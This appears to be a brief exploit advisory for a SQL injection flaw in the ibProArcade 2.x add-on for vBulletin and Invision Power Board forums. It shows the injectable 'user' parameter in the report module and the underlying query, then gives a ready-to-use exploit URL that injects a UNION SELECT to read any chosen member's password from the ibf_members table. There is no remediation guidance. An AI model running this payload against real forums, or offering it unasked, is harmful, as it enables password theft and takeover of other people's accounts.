This bug was discoverd in all of the versions of ibproarcade 2.x.
It was tested and found perfectly working under vBulettin or Invision power board.

The injection is here:
module=report&user=[userid]
Query: 'SELECT name FROM ibf_members WHERE id=[userid]'

Exploit:
IPB:
index.php?act=Arcade&module=report&user=-1 union select password from ibf_members where id=[any_user]
